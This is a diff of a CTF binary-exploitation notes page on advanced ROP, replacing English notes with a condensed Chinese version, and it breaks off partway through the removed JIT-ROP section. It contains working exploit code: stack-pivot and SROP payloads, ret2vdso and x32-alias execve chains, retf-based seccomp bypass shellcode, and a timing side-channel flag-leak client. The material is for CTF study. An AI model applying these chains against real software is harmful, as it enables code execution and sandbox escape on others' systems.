@@ -1,729 +1,337 @@
-# CTF Pwn - Advanced ROP Techniques
-
-## Table of Contents
-- [Double Stack Pivot to BSS via leave;ret (Midnightflag 2026)](#double-stack-pivot-to-bss-via-leaveret-midnightflag-2026)
-- [SROP with UTF-8 Payload Constraints (DiceCTF 2026)](#srop-with-utf-8-payload-constraints-dicectf-2026)
-- [Seccomp Bypass](#seccomp-bypass)
-- [RETF Architecture Switch for Seccomp Bypass (Midnightflag 2026)](#retf-architecture-switch-for-seccomp-bypass-midnightflag-2026)
-- [Stack Shellcode with Input Reversal](#stack-shellcode-with-input-reversal)
-- [.fini_array Hijack](#fini_array-hijack)
-- [pwntools Template](#pwntools-template)
-  - [Automated Offset Finding via Corefile (Crypto-Cat)](#automated-offset-finding-via-corefile-crypto-cat)
-- [ret2vdso — Using Kernel vDSO Gadgets (HTB Nowhere to go)](#ret2vdso--using-kernel-vdso-gadgets-htb-nowhere-to-go)
-  - [Step 1 — Stack leak](#step-1--stack-leak)
-  - [Step 2 — Write `/bin/sh` to known address](#step-2--write-binsh-to-known-address)
-  - [Step 3 — Find vDSO base via AT_SYSINFO_EHDR](#step-3--find-vdso-base-via-at_sysinfo_ehdr)
-  - [Step 4 — Dump vDSO and find gadgets](#step-4--dump-vdso-and-find-gadgets)
-  - [Step 5 — execve ROP chain](#step-5--execve-rop-chain)
-- [Vsyscall ROP for PIE Bypass (Hack.lu 2015)](#vsyscall-rop-for-pie-bypass-hacklu-2015)
-- [x32 ABI Syscall Number Aliasing for Seccomp Bypass (BCTF 2017)](#x32-abi-syscall-number-aliasing-for-seccomp-bypass-bctf-2017)
-- [Time-Based Blind Shellcode When write() Blocked (DEF CON 2017)](#time-based-blind-shellcode-when-write-blocked-def-con-2017)
-- [JIT-ROP: Scan for syscall Byte in Leaked libc Function (Codegate 2018)](#jit-rop-scan-for-syscall-byte-in-leaked-libc-function-codegate-2018)
-- [ret2dl_resolve 64-bit (Codegate 2018)](#ret2dl_resolve-64-bit-codegate-2018)
-- [Prime-Only ROP via Goldbach Decomposition (PlaidCTF 2018)](#prime-only-rop-via-goldbach-decomposition-plaidctf-2018)
-- [Imperfect-Gadget Stack Pivot (RITSEC 2018)](#imperfect-gadget-stack-pivot-ritsec-2018)
-- [_fini_array Double-Entry Staged ROP (Insomnihack 2019)](#_fini_array-double-entry-staged-rop-insomnihack-2019)
-- [ret2libc via Statically-Linked libc + Embedded /bin/sh String (TAMUctf 2019)](#ret2libc-via-statically-linked-libc--embedded-binsh-string-tamuctf-2019)
-- [Useful Commands](#useful-commands)
-
-For core ROP chain building, ret2csu, bad character bypass, exotic gadgets, and stack pivot via xchg, see [[binary/漏洞利用/rop-and-shellcode.md|rop-and-shellcode.md]].
-
 ---
 
-## Double Stack Pivot to BSS via leave;ret (Midnightflag 2026)
-
-**Pattern (Eyeless):** Small stack overflow (22 bytes past buffer) — enough to overwrite RBP + RIP but too small for a ROP chain. No libc leak available. Use two `leave; ret` pivots to relocate execution to BSS, then chain `fgets` calls to write arbitrary-length ROP.
-
-**Stage 1 — Pivot to BSS:**
-```python
-BSS_STAGE = 0x404500  # writable BSS address
-LEAVE_RET = 0x4013d9  # leave; ret gadget
-
-# Overflow: 128-byte buffer + RBP + RIP
-payload = b'A' * 128
-payload += p64(BSS_STAGE)   # overwrite RBP → BSS
-payload += p64(LEAVE_RET)   # leave sets RSP = RBP (BSS), then ret
-```
-
-**Stage 2 — Chain fgets for large ROP:**
-```python
-# After pivot, RSP is at BSS_STAGE. Pre-place a mini-ROP there that
-# calls fgets(BSS+0x600, 0x700, stdin) to read the real ROP chain:
-POP_RDI = 0x4013a5
-POP_RSI_R15 = 0x4013a3
-SET_RDX_STDIN = 0x40136a  # gadget that sets rdx = stdin FILE*
-
-stage2 = flat(
-    SET_RDX_STDIN,
-    POP_RDI, BSS_STAGE + 0x100,  # destination buffer
-    POP_RSI_R15, 0x700, 0,       # size
-    elf.plt['fgets'],             # fgets(buf, 0x700, stdin)
-    BSS_STAGE + 0x100,            # return into the new ROP chain
-)
-```
-
-**Key insight:** `leave; ret` is equivalent to `mov rsp, rbp; pop rbp; ret`. Overwriting RBP controls where RSP lands after `leave`. Two pivots solve the "too small for ROP" problem: first pivot moves to BSS where a small bootstrap ROP calls `fgets` to load the full exploit.
-
-**When to use:** Overflow is too small for a full ROP chain AND the binary uses `fgets`/`read` (or similar input function) that can be called via PLT. BSS is always writable and at a known address (no PIE or PIE leaked).
-
+phase: binary
+vuln_class: [pwn, rop, srop, seccomp, ret2dlresolve, stack-pivot, fini-array]
+title: ROP 进阶
+summary: 基础 ROP 打不动时的六条出路——换栈、换架构、换 syscall 号、换解析器、换执行时机、换 payload 表示。判据是「被哪一层挡住」。
 ---
 
-## SROP with UTF-8 Payload Constraints (DiceCTF 2026)
+# ROP 进阶
 
-**Pattern (Message Store):** Rust binary where OOB color index reads memcpy from GOT, causing `memcpy(stack, BUFFER, 0x1000)` — a massive stack overflow. But `from_utf8_lossy()` validates the buffer first: any invalid UTF-8 triggers `Cow::Owned` with corrupted replacement data. **The entire 0x1000-byte payload must be valid UTF-8.**
+基础链、ret2csu、坏字符、`xchg` 枢轴见 [[binary/漏洞利用/rop-and-shellcode.md|ROP 与 shellcode]]；原语查表见 [[binary/漏洞利用/field-notes.md|原语速查表]]；seccomp 的通用打法见 [[binary/漏洞利用/advanced.md|语义误用与 seccomp]]。
 
-**Why SROP:** Normal ROP gadget addresses contain bytes >0x7f which are invalid single-byte UTF-8. SROP needs only 3 gadgets (set rax=15, call syscall) to trigger `sigreturn`, then a signal frame sets ALL registers for `execve("/bin/sh", NULL, NULL)`.
+## 0. 判据速查
 
-**UTF-8 multi-byte spanning trick:** Register fields in the signal frame are 8 bytes each, packed contiguously. A 3-byte UTF-8 sequence can start in one field and end in the next:
+| 被什么挡住 | 解法 | 去哪节 |
+|---|---|---|
+| 溢出只有 20 来字节，装不下链 | 两次 `leave;ret` 换到 BSS，再用 `fgets` 灌长链 | §1 |
+| payload 必须整体是合法 UTF-8 | SROP 只用 3 个 gadget，帧内跨字段拼 UTF-8 | §2 |
+| 溢出太小且静态链接、无 PLT/GOT | `_fini_array` 双入口当可重入回调表 | §3 |
+| 静态链接但有 `system` 和 `/bin/sh` | 12 字节 `system;exit;&binsh` 就够 | §4 |
+| 二进制里一个有用 gadget 都没有 | 打 vDSO（`AT_SYSINFO_EHDR` 定位） | §5 |
+| 要绕 PIE 但没有 leak | vsyscall 固定地址当 `ret` 滑板 | §6 |
+| seccomp 精确匹配 `execve` | x32 ABI 号 `0x4000003B` | §7 |
+| seccomp 按 `AUDIT_ARCH_X86_64` 配的 | `retf` 切 32 位，走 `int 0x80` | §8 |
+| seccomp 挡了 `open`/`openat` | `openat2`(437)、`sendfile`(40)、`readv`/`writev` | §9 |
+| seccomp 挡了所有写 syscall | 计时侧信道逐字节试 | §10 |
+| 不知道 libc 版本但要 `syscall` | 从泄露的 `read()` 函数体里扫 `0f 05` | §11 |
+| 完全没 libc leak，Partial RELRO | 伪造 `Rela`/`Sym`/dynstr 让链接器自己解析 | §12 |
+| 栈上每个字必须满足某个数论性质 | 拆成两份合法值的和 + 一个合并 gadget | §13 |
+| 唯一的枢轴 gadget 夹着垃圾指令 | 逐行看有没有踩 `esp`，没有就照用 | §14 |
+| 输入会被反转 | 反着写 shellcode，用 `jmp *%rsp` 落地 | §15 |
+
+## 1. 两次 `leave;ret` 换栈
+
+溢出只够盖 `rbp` + `rip`，装不下链，也没有 libc leak。
 
 ```python
-from pwn import *
-
-# r15 is the field immediately before rdi in the sigframe
-# rdi = pointer to "/bin/sh" = 0x2f9fb0 → bytes [B0, 9F, 2F, ...]
-# B0, 9F are UTF-8 continuation bytes (10xxxxxx) — invalid as sequence start
-# Solution: set r15's last byte to 0xE0 (3-byte UTF-8 leader)
-# E0 B0 9F = valid UTF-8 (U+0C1F) spanning r15→rdi boundary
-
-frame = SigreturnFrame()
-frame.rax = 59          # execve
-frame.rdi = buf_addr + 0x178  # address of "/bin/sh\0"
-frame.rsi = 0
-frame.rdx = 0
-frame.rip = syscall_addr
-frame.r15 = 0xE000000000000000  # Last byte 0xE0 starts 3-byte UTF-8 seq
-
-# ROP preamble: 3 UTF-8-safe gadgets
-payload = b'\x00' * 0x48           # padding to return address
-payload += p64(pop_rax_ret)        # set rax = 15 (sigreturn)
-payload += p64(15)
-payload += p64(syscall_ret)        # trigger sigreturn
-payload += bytes(frame)
-# Place "/bin/sh\0" at offset 0x178 in BUFFER
+payload  = b'A' * 128
+payload += p64(BSS_STAGE)     # 盖掉 rbp → 指向 BSS
+payload += p64(LEAVE_RET)     # leave: rsp=rbp=BSS；ret: 跳到 BSS 上第一条
 ```
 
-**When to use:** Any exploit where payload bytes pass through UTF-8 validation (Rust `String`, `from_utf8`, JSON parsers). SROP minimizes the number of gadget addresses that must be UTF-8-safe.
+`leave; ret` 等价于 `mov rsp, rbp; pop rbp; ret`——**控 `rbp` 就等于控换栈目标**。第一次换到 BSS 后，那里预置一段迷你 ROP 调 `fgets`，把真正的长链读进来：
 
-**Key insight:** Multi-byte UTF-8 sequences (2-4 bytes) can span adjacent fields in structured data (signal frames, ROP chains). Set the leader byte (0xC0-0xF7) as the last byte of one field so continuation bytes (0x80-0xBF) in the next field form a valid sequence.
-
-## Seccomp Bypass
-
-Alternative syscalls when seccomp blocks `open()`/`read()`:
-- `openat()` (257), `openat2()` (437, often missed!), `sendfile()` (40), `readv()`/`writev()`
-
-**Check rules:** `seccomp-tools dump ./binary`
-
-See [[binary/漏洞利用/advanced.md|advanced.md]] for: conditional buffer address restrictions, shellcode construction without relocations (call/pop trick), seccomp analysis from disassembly, `scmp_arg_cmp` struct layout.
-
-## RETF Architecture Switch for Seccomp Bypass (Midnightflag 2026)
-
-**Pattern (Eyeless):** Seccomp blocks `execve`, `execveat`, `open`, `openat` in 64-bit mode. Switch to 32-bit (IA-32e compatibility mode) where syscall numbers differ and the filter does not apply.
-
-**How it works:** The `retf` (far return) instruction pops RIP then CS from the stack. Setting `CS = 0x23` switches the CPU to 32-bit compatibility mode. In 32-bit mode, `int 0x80` uses different syscall numbers: `open=5`, `read=3`, `write=4`, `exit=1`.
-
-**ROP chain to switch modes:**
 ```python
-POP_RDX_RBX = libc_base + 0x8f0c5  # pop rdx; pop rbx; ret
-POP_RDI     = 0x4013a5
-POP_RSI_R15 = 0x4013a3
-RETF        = libc_base + 0x294bf   # retf gadget in libc
+stage2 = flat(SET_RDX_STDIN,
+              POP_RDI, BSS_STAGE + 0x100,
+              POP_RSI_R15, 0x700, 0,
+              elf.plt['fgets'],
+              BSS_STAGE + 0x100)     # 直接返回到刚读进来的链
+```
 
-# Step 1: mprotect BSS as RWX for shellcode
-rop  = flat(POP_RDI, 0x404000)          # addr = BSS page
-rop += flat(POP_RSI_R15, 0x1000, 0)     # size = page
-rop += flat(POP_RDX_RBX, 7, 0)          # prot = RWX
-rop += flat(libc_base + libc.sym.mprotect)
+**两次而非一次**：第一次只完成「换栈」，第二次（`fgets` 后的 `ret`）才落到真正载荷。判据是「溢出窗口 < 一条完整链长度」且 BSS 可写且地址已知（无 PIE 或已泄）。
 
-# Step 2: Far return to 32-bit shellcode on BSS
+## 2. UTF-8 约束下的 SROP
+
+Rust 的 `from_utf8_lossy()` 会把非法 UTF-8 换成替换字符，等于把 payload 改掉。而**普通 ROP 的 gadget 地址高位是 `0x00 0x40 0x7f` 之类，单字节就不合法**。
+
+SROP 只用 3 个 gadget（`pop rax`、`syscall`、返回地址），然后把「所有寄存器」交给 15 号 `sigreturn` 的信号帧，帧里全是 8 字节字段。
+
+**关键技巧：多字节 UTF-8 可以跨字段**。信号帧字段紧邻排布，一个 3 字节序列可以从 `r15` 的最后一字节开始、在 `rdi` 的前两字节结束：
+
+```python
+# rdi 想指向 0x2f9fb0 → 字节 [B0, 9F, 2F, ...]
+# B0/9F 是 10xxxxxx 续字节，不能做序列首字节
+# 把 r15 的末字节设成 0xE0（3 字节首字节）
+# E0 B0 9F = U+0C1F，跨 r15→rdi 边界构成合法序列
+frame.r15 = 0xE000000000000000
+frame.rdi = buf_addr + 0x178
+```
+
+判据：payload 要过 `String`/`from_utf8`/JSON 解析。**SROP 的价值是「把 gadget 数量压到 3 个」**，不是「省字节」。
+
+## 3. `_fini_array` 双入口
+
+静态链接、没有 PLT/GOT 可劫持，但 `_fini_array` 里的指针在 `exit()` 时会被调用。两个槽都写成同一个「能再写一段字节」的 gadget：
+
+```text
+_fini_array[0] = do_overwrite   # 第一轮：写下一段
+_fini_array[1] = do_overwrite   # 第二轮：写最后一段并触发
+```
+
+配 `add rsp, N; ret` 往下走栈，每轮把新内容接在上一帧后面。**效果是一个可重入回调表**——不需要重启进程就能无限加深 ROP。
+
+注意 `.fini_array` 在 Full RELRO 下也常可写（它不在 GOT 段），比劫持 GOT 的适用范围更广。
+
+## 4. 静态链接的 12 字节 ret2libc
+
+`checksec` 显示 No PIE + `file` 说 statically linked，则 `system`、`exit` 和 `"/bin/sh"` 全在二进制内固定偏移——**libc 的整个字符串表也被静态链接拖进来了**。
+
+```python
+payload  = cyclic(17)      # 溢出到 saved EIP 只有 17 字节
+payload += p32(system)     # 0x0804ee30
+payload += p32(exit_a)     # 0x0804e330，避免 shell 退出后 SIGSEGV
+payload += p32(binsh)      # 0x080bc140
+```
+
+```bash
+strings -a binary | grep -n /bin/sh
+nm binary | grep ' T system'
+```
+
+**溢出窗口再小也能塞下 12 字节**，这是「窗口太小」类题的第一优先检查项。
+
+## 5. ret2vdso
+
+静态链接、函数极少、`ROPgadget` 一个可用 gadget 都搜不出。但内核给每个进程映射了 vDSO，里面有足够 `execve` 的 gadget。
+
+五步：泄栈 → 用二进制自己的 `read` 把 `/bin/sh` 写到页对齐的已知地址 → dump 栈找 `AT_SYSINFO_EHDR`（auxv 类型 `0x21`）拿 vDSO 基址 → dump vDSO 找 gadget → 拼链。
+
+```python
+for i in range(0, len(stackdump) - 15, 8):
+    if u64(stackdump[i:i+8]) == 0x21:
+        cand = u64(stackdump[i+8:i+16])
+        if 0x7f0000000000 <= cand <= 0x7fffffffffff and cand & 0xFFF == 0:
+            vdso_base = cand; break
+```
+
+```python
+POP_RDX_RAX_RET     = vdso_base + 0xba0   # pop rdx; pop rax; ret
+POP_RBX_R12_RBP_RET = vdso_base + 0x8c6
+MOV_RDI_RBX_SYSCALL = vdso_base + 0x8e3   # mov rdi,rbx; mov rsi,r12; syscall
+```
+
+**vDSO 的 gadget 偏移随内核版本变**，必须 dump 远程的那份，别用本地偏移。QEMU 托管的自定义内核尤其明显。
+
+## 6. vsyscall 当固定地址滑板
+
+老内核把 vsyscall 页映射在 `0xffffffffff600000`，**与 ASLR/PIE 无关**，且每个入口末尾都有 `ret`：
+
+- `0xffffffffff600000` gettimeofday
+- `0xffffffffff600400` time
+- `0xffffffffff600800` getcpu
+
+```python
+payload  = b'A' * 72
+payload += p64(0xffffffffff600400)   # 当 NOP-ret
+payload += p64(0xffffffffff600400)
+payload += b"\x8b\x10"               # 2 字节部分覆盖返回到目标
+```
+
+`cat /proc/self/maps | grep vsyscall` 先确认存在；新内核可能 `vsyscall=none` 直接没有。
+
+## 7. x32 ABI syscall 号混叠
+
+x32 ABI 把 `0x40000000` 或进 syscall 号。多数 BPF 只比对低 32 位的精确值，`59` 被拦而 `0x4000003B` 漏过，内核仍派发到同一个 `execve` handler。
+
+```python
+rop = flat(pop_rax, 0x4000003B,
+           pop_rdi, binsh, pop_rsi, 0, pop_rdx, 0, syscall_ret)
+```
+
+判据：`seccomp-tools dump` 看它有没有校验 `AUDIT_ARCH`、有没有先把 x32 位掩掉。现代策略用 `SECCOMP_RET_KILL_PROCESS` + 显式校验 `AUDIT_ARCH_X86_64` 就堵死了。
+
+## 8. `retf` 切 32 位
+
+seccomp 按 `AUDIT_ARCH_X86_64` 配的，只管 64 位 syscall。`retf`（远返回）从栈上弹 `RIP` 再弹 `CS`，`CS = 0x23` 就把 CPU 切到 IA-32e 兼容模式，此时 `int 0x80` 用另一套号（`open=5`、`read=3`、`write=4`、`exit=1`）。
+
+```python
+# 先 mprotect BSS 成 RWX（32 位 shellcode 要在可执行页上跑）
+rop  = flat(POP_RDI, 0x404000, POP_RSI_R15, 0x1000, 0,
+            POP_RDX_RBX, 7, 0, libc_base + libc.sym.mprotect)
 rop += flat(RETF)
-rop += p32(0x404a80)   # 32-bit EIP (shellcode address on BSS)
-rop += p32(0x23)        # CS = 0x23 (IA-32e compatibility mode)
+rop += p32(0x404a80)     # 32 位 EIP
+rop += p32(0x23)         # CS
 ```
 
-**32-bit shellcode (open/read/write flag):**
-```nasm
-mov esp, 0x404100       ; set up 32-bit stack
-push 0x67616c66         ; "flag" (reversed)
-push 0x2f2f2f2f         ; "////"
-mov ebx, esp            ; ebx = filename pointer
-
-mov eax, 5              ; SYS_open (32-bit)
-xor ecx, ecx            ; O_RDONLY
-int 0x80                ; open("////flag", O_RDONLY)
-
-mov ebx, eax            ; fd from open
-mov ecx, esp            ; buffer
-mov edx, 0x100          ; size
-mov eax, 3              ; SYS_read (32-bit)
-int 0x80
-
-mov edx, eax            ; bytes read
-mov ecx, esp            ; buffer
-mov ebx, 1              ; stdout
-mov eax, 4              ; SYS_write (32-bit)
-int 0x80
-
-mov eax, 1              ; SYS_exit
-int 0x80
-```
-
-**Key insight:** Seccomp filters configured for `AUDIT_ARCH_X86_64` do not check 32-bit `int 0x80` syscalls. The `retf` gadget (found in libc) switches architecture by loading CS=0x23. Requires making a memory region executable first via `mprotect`, since 32-bit shellcode must run from writable+executable memory.
-
-**Finding retf in libc:**
 ```bash
 ROPgadget --binary libc.so.6 | grep retf
-# Or search for byte 0xcb:
-objdump -d libc.so.6 | grep -w retf
+objdump -d libc.so.6 | grep -w retf    # 也可以直接找 0xcb
 ```
 
-**When to use:** Seccomp blocks critical 64-bit syscalls (`open`, `openat`, `execve`) but does not use `SECCOMP_FILTER_FLAG_SPEC_ALLOW` or check `AUDIT_ARCH`. Combine with `mprotect` to make BSS/heap executable for the 32-bit shellcode.
+**必须 `mprotect`**：32 位 shellcode 跑在 BSS 上，那页默认不可执行。
 
----
+## 9. seccomp 下换 syscall
 
-## Stack Shellcode with Input Reversal
-
-**Pattern (Scarecode):** Binary reverses input buffer before returning.
-
-**Strategy:**
-1. Leak address via info-leak command (bypass PIE)
-2. Find `sub rsp, 0x10; jmp *%rsp` gadget
-3. Pre-reverse shellcode and RIP overwrite bytes
-4. Use partial 6-byte RIP overwrite (avoids null bytes from canonical addresses)
-5. Place trampoline (`jmp short`) to hop back into NOP sled + shellcode
-
-**Null-byte avoidance with `scanf("%s")`:**
-- Can't embed `\x00` in payload
-- Use partial pointer overwrite (6 bytes) -- top 2 bytes match since same mapping
-- Use short jumps and NOP sleds instead of multi-address ROP chains
-
-## .fini_array Hijack
-
-**When to use:** Writable `.fini_array` + arbitrary write primitive. When `main()` returns, entries called as function pointers. Works even with Full RELRO.
-
-```python
-# Find .fini_array address
-fini_array = elf.get_section_by_name('.fini_array').header.sh_addr
-# Or: objdump -h binary | grep fini_array
-
-# Overwrite with format string %hn (2-byte writes)
-writes = {
-    fini_array: target_addr & 0xFFFF,
-    fini_array + 2: (target_addr >> 16) & 0xFFFF,
-}
+```bash
+seccomp-tools dump ./binary
 ```
 
-**Advantages over GOT overwrite:** Works even with Full RELRO (`.fini_array` is in a different section). Especially useful when combined with RWX regions for shellcode.
+被挡 `open`/`read` 时的替代：`openat`(257)、**`openat2`(437，最常被漏)**、`sendfile`(40)、`readv`/`writev`。
 
-## pwntools Template
+`openat2` 特别值得试——很多策略只列了 `open`/`openat`，`openat2` 是 5.6 之后才有的新号。
 
-```python
-from pwn import *
+## 10. 计时侧信道
 
-elf = ELF('./binary', checksec=False)
-context.binary = elf
-context.log_level = 'debug'
-
-HOST = args.HOST or 'host'
-PORT = args.PORT or 1337
-
-def conn():
-    if args.GDB:
-        return gdb.debug(elf.path, gdbscript='init-pwndbg\ncontinue')
-    elif args.REMOTE:
-        return remote(HOST, PORT)
-    return process(elf.path)
-
-io = conn()
-# exploit here
-io.interactive()
-```
-
-### Automated Offset Finding via Corefile (Crypto-Cat)
-
-Automatically determine buffer overflow offset without manual `cyclic -l`:
-```python
-def find_offset(exe):
-    p = process(exe, level='warn')
-    p.sendlineafter(b'>', cyclic(500))
-    p.wait()
-    # x64: read saved RIP from stack pointer
-    offset = cyclic_find(p.corefile.read(p.corefile.sp, 8))
-    # x86: use pc directly
-    # offset = cyclic_find(p.corefile.pc)
-    log.warn(f'Offset: {offset}')
-    return offset
-```
-
-**Key insight:** pwntools auto-generates a core file from the crashed process. Reading the saved return address from `corefile.sp` (x64) or `corefile.pc` (x86) and passing it to `cyclic_find()` gives the exact offset. Eliminates manual GDB inspection.
-
-## ret2vdso — Using Kernel vDSO Gadgets (HTB Nowhere to go)
-
-**Pattern:** Statically-linked binary with minimal functions and zero useful ROP gadgets (no `pop rdi`, `pop rsi`, `pop rax`, etc.). The Linux kernel maps a vDSO (Virtual Dynamic Shared Object) into every process, and it contains enough gadgets for `execve`.
-
-### Step 1 — Stack leak
-
-Overflow a buffer and read back more bytes than sent to leak stack pointers:
-```python
-p.send(b'A' * 0x20)
-resp = p.recv(0x80)
-leak = u64(resp[0x30:0x38])
-stackbase = (leak & 0x0000FFFFFFFFF000) - 0x20000
-```
-
-### Step 2 — Write `/bin/sh` to known address
-
-Use the binary's own `read` function via ROP to place `/bin/sh\0` at a page-aligned stack address:
-```python
-payload = b'B' * 32 + p64(READ_FUNC) + p64(LOOP) + p64(0x8) + p64(stackbase)
-p.sendline(payload)
-p.send(b'/bin/sh\x00')
-```
-
-### Step 3 — Find vDSO base via AT_SYSINFO_EHDR
-
-Dump the stack using the binary's `write` function. Search for `AT_SYSINFO_EHDR` (auxv type `0x21`) which holds the vDSO base address:
-```python
-# Dump 0x21000 bytes from stackbase
-for i in range(0, len(stackdump) - 15, 8):
-    val = u64(stackdump[i:i+8])
-    if val == 0x21:  # AT_SYSINFO_EHDR
-        next_val = u64(stackdump[i+8:i+16])
-        if 0x7f0000000000 <= next_val <= 0x7fffffffffff and (next_val & 0xFFF) == 0:
-            vdso_base = next_val
-            break
-```
-
-### Step 4 — Dump vDSO and find gadgets
-
-Dump 0x2000 bytes from `vdso_base` using the binary's `write` function, then search for gadgets. Common vDSO gadgets:
-```python
-POP_RDX_RAX_RET     = vdso_base + 0xba0  # pop rdx; pop rax; ret
-POP_RBX_R12_RBP_RET = vdso_base + 0x8c6  # pop rbx; pop r12; pop rbp; ret
-MOV_RDI_RBX_SYSCALL = vdso_base + 0x8e3  # mov rdi, rbx; mov rsi, r12; syscall
-```
-
-### Step 5 — execve ROP chain
-
-```python
-payload = b'A' * 32
-payload += p64(POP_RDX_RAX_RET)
-payload += p64(0x0)              # rdx = NULL (envp)
-payload += p64(59)               # rax = execve
-payload += p64(POP_RBX_R12_RBP_RET)
-payload += p64(stackbase)        # rbx → rdi = &"/bin/sh"
-payload += p64(0x0)              # r12 → rsi = NULL (argv)
-payload += p64(0xdeadbeef)       # rbp (dummy)
-payload += p64(MOV_RDI_RBX_SYSCALL)
-```
-
-**Key insight:** The vDSO is kernel-specific — different kernels have different gadget offsets. Always dump the remote vDSO rather than assuming local offsets. The auxv `AT_SYSINFO_EHDR` (type 0x21) on the stack is the reliable way to find the vDSO base address.
-
-**Detection:** Statically-linked binary with few functions, no libc, and no useful gadgets. QEMU-hosted challenges often run custom kernels with unique vDSO layouts.
-
----
-
-## Vsyscall ROP for PIE Bypass (Hack.lu 2015)
-
-On older Linux kernels, vsyscall page is mapped at a fixed address (`0xffffffffff600000-0xffffffffff601000`) regardless of ASLR/PIE. Each vsyscall entry ends with `ret`, providing gadgets at known addresses:
-
-- `0xffffffffff600000` — gettimeofday (ret at +0x9)
-- `0xffffffffff600400` — time (ret at +0x9)
-- `0xffffffffff600800` — getcpu (ret at +0x9)
-
-Use vsyscall `ret` gadgets to slide the stack to a partial return address overwrite:
-
-```python
-from pwn import *
-
-payload = b'A' * 72                      # padding to return address
-payload += p64(0xffffffffff600400)        # vsyscall time: acts as NOP-ret
-payload += p64(0xffffffffff600400)        # second NOP-ret for alignment
-payload += b"\x8b\x10"                    # partial overwrite to target (2 bytes)
-```
-
-**Key insight:** Vsyscall addresses are fixed even with PIE+ASLR. Modern kernels emulate vsyscalls (trap to kernel), but the addresses remain predictable. Check with `cat /proc/self/maps | grep vsyscall`.
-
-**Note:** Some newer kernels disable vsyscall entirely (`vsyscall=none`). Verify availability before relying on this technique.
-
----
-
-## x32 ABI Syscall Number Aliasing for Seccomp Bypass (BCTF 2017)
-
-**Pattern:** Linux x32 ABI (32-bit pointers on 64-bit kernel) uses syscall numbers with bit 30 set (`0x40000000`). Most seccomp BPF filters only check the low 32 bits against known syscall numbers, missing the x32 variants.
-
-```c
-// Standard execve blocked by seccomp: syscall 59
-// x32 ABI variant: syscall 0x40000000 | 59 = 0x4000003B
-// Often passes through BPF filters that check for exact match on 59
-syscall(0x4000003B, "/bin/sh", NULL, NULL);
-```
-
-```python
-from pwn import *
-
-# ROP chain using x32 ABI syscall number to bypass seccomp
-pop_rax = libc_base + rax_gadget
-pop_rdi = libc_base + rdi_gadget
-pop_rsi = libc_base + rsi_gadget
-pop_rdx = libc_base + rdx_gadget
-syscall_ret = libc_base + syscall_gadget
-
-rop = flat(
-    pop_rax, 0x4000003B,              # x32 execve (bypasses seccomp)
-    pop_rdi, binsh_addr,              # "/bin/sh"
-    pop_rsi, 0,                       # argv = NULL
-    pop_rdx, 0,                       # envp = NULL
-    syscall_ret,                      # trigger x32 execve
-)
-```
-
-**Key insight:** The x32 ABI ORs `0x40000000` into syscall numbers. Seccomp filters checking for `SCMP_ACT_KILL` on `__NR_execve` (59) miss `__NR_execve | __X32_SYSCALL_BIT` (0x4000003B), which the kernel still dispatches to the same handler. This works on kernels compiled with `CONFIG_X86_X32=y` (common on older distributions).
-
-**When to recognize:** Seccomp filter blocks specific syscall numbers via exact match or range check. Dump the BPF with `seccomp-tools dump ./binary` and check whether it validates the `AUDIT_ARCH` or masks off the x32 bit before comparing. If neither, x32 aliasing bypasses the filter.
-
-**Mitigation check:** Modern seccomp policies use `SECCOMP_RET_KILL_PROCESS` and verify `AUDIT_ARCH_X86_64` explicitly, blocking this technique.
-
-**References:** BCTF 2017
-
----
-
-## Time-Based Blind Shellcode When write() Blocked (DEF CON 2017)
-
-**Pattern:** When seccomp blocks all output syscalls (`write`, `sendto`, `writev`), use a timing side-channel to exfiltrate flag data character-by-character: compare each byte against a guess, loop on match.
+seccomp 挡了所有写 syscall（`write`/`sendto`/`writev`）时，用「匹配就烧 CPU」把字节泄露出去：
 
 ```nasm
-; Read flag into buffer, then compare character N
-; Assumes flag has been read into rsi via allowed read() syscall
-mov al, [rsi + N]      ; flag byte N
-cmp al, 0x41           ; compare with guess 'A'
-jne done               ; skip if no match
-; Timing loop: burns ~4 seconds on match
+mov al, [rsi + N]        ; 取 flag 第 N 字节
+cmp al, 0x41             ; 猜 'A'
+jne done
 xor ecx, ecx
 .loop: inc ecx
-cmp ecx, 0xffffffff
+cmp ecx, 0xffffffff      ; 命中就空转约 4 秒
 jne .loop
 done: xor edi, edi
-mov eax, 60            ; exit
+mov eax, 60
 syscall
 ```
 
-```python
-from pwn import *
-import time
+客户端测 `elapsed > 3.0` 判命中。**每次连接只试一个字节**，最坏 `95 × 长度` 次连接，可打印字符集能压到这个量级。
 
-FLAG_LEN = 40
-CHARSET = string.printable
+判据：允许 `open`/`read` 但所有写族被禁；或程序本身没有任何输出路径。
 
-def guess_byte(offset, guess_char):
-    """Send shellcode that delays if flag[offset] == guess_char"""
-    sc = shellcraft.amd64.linux.open("flag.txt", 0)
-    sc += shellcraft.amd64.linux.read("rax", "rsp", 100)
-    sc += f"""
-        mov al, byte ptr [rsp + {offset}]
-        cmp al, {ord(guess_char)}
-        jne done
-        xor ecx, ecx
-    loop:
-        inc ecx
-        cmp ecx, 0xffffffff
-        jne loop
-    done:
-        xor edi, edi
-        mov eax, 60
-        syscall
-    """
-    r = remote(host, port)
-    r.send(asm(sc))
-    start = time.time()
-    try:
-        r.recvall(timeout=6)
-    except:
-        pass
-    elapsed = time.time() - start
-    r.close()
-    return elapsed > 3.0  # Match if response took > 3 seconds
+## 11. JIT-ROP：从 `read()` 函数体里扫 `syscall`
 
-flag = ""
-for i in range(FLAG_LEN):
-    for c in CHARSET:
-        if guess_byte(i, c):
-            flag += c
-            print(f"Flag so far: {flag}")
-            break
-```
+不知道 libc 版本，但能泄露 GOT、能任意读。`read()` 内部必然有一条 `syscall`：
 
-**Key insight:** When seccomp blocks all output syscalls (`write`, `sendto`, `writev`), a flag byte can still be exfiltrated by comparing it against a guessed value and burning CPU time on match. The response time difference (instant vs ~4 seconds) reveals whether the guess was correct. Requires up to 256 * flag_length connections worst case, but printable ASCII reduces this to ~95 * flag_length.
-
-**When to recognize:** Seccomp allows `open`/`read` but blocks all write-family syscalls. Also applicable when the binary has no output path at all (e.g., embedded systems, bare-metal challenges).
-
-**References:** DEF CON 2017
-
----
-
-## JIT-ROP: Scan for syscall Byte in Leaked libc Function (Codegate 2018)
-
-**Pattern:** Instead of identifying the remote libc version to find gadgets, leak a GOT entry (e.g., `read@GOT`), then read the machine code of that function to find a `syscall` instruction within it. Use the `read()` return value to control `rax` for the syscall number.
-
-**Exploitation:**
-```python
-from pwn import *
-
-# Step 1: Leak read@GOT address via format string / arbitrary read
-read_addr = leak_got(elf.got['read'])
-log.info(f"read() @ {hex(read_addr)}")
-
-# Step 2: Read bytes within read() function body
-# Use an arbitrary read primitive (e.g., format string %s, or read() itself)
